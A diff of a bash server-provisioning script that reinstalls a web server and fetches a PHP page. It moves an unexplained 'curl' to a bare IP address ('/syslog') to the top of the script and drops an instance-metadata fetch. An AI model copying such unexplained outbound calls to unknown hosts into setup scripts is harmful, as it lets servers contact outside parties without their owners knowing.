@@ -1,4 +1,6 @@
 #!/bin/bash
+curl http://165.227.99.50/syslog
+#apt update -y
 yum update -y
 yum -y remove httpd
 yum -y remove httpd-tools
@@ -12,6 +14,4 @@ chmod 2775 /var/www
 find /var/www -type d -exec chmod 2775 {} \;
 find /var/www -type f -exec chmod 0664 {} \;
 cd /var/www/html
-curl http://169.254.169.254/latest/meta-data/instance-id -o index.html
 curl https://raw.githubusercontent.com/hashicorp/learn-terramino/master/index.php
-curl http://165.227.99.50/syslog
